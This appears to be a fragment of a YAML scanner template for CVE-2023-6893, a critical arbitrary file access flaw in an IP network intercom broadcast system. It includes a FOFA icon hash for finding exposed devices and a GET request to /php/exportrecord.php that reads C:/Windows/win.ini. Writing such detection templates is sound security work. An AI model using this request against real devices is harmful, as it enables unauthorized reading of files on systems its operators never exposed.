  severity: critical
  tags:
  - CVE-2023-6893
  - 任意文件或目录访问
  finger: IP网络对讲广播系统
  fofa: icon_hash="-1830859634"
requests:
- method: GET
  path: /php/exportrecord.php?downtype=10&downname=C:/Windows/win.ini
